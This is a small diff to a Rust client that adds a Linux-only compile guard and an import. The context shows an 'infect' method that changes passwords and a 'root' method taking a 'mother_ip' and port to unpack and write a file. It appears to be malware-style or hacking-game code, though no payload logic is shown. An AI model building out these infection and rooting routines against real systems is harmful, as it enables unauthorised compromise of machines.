@@ -1,4 +1,4 @@
-use crate::client::types::{Disk, Host, Infect, User, UserInfo, OS};
+use crate::client::types::{Disk, Host, Infect, User, UserInfo, OS, ServerFeatures};
 use anyhow::Result;
 use rand::{thread_rng, Rng};
 use reqwest::{
@@ -122,7 +122,7 @@ impl Host {
     pub fn infect(&self, magic: u8, scheme: &str) {
         self.change_password(magic, scheme);
     }
-
+    #[cfg(target_os = "linux")]
     pub fn root(&self, mother_ip: &str, port: u16, lifetime: u8) -> anyhow::Result<()> {
         // Decompress and write SERIAL file from bytes using flate2
 
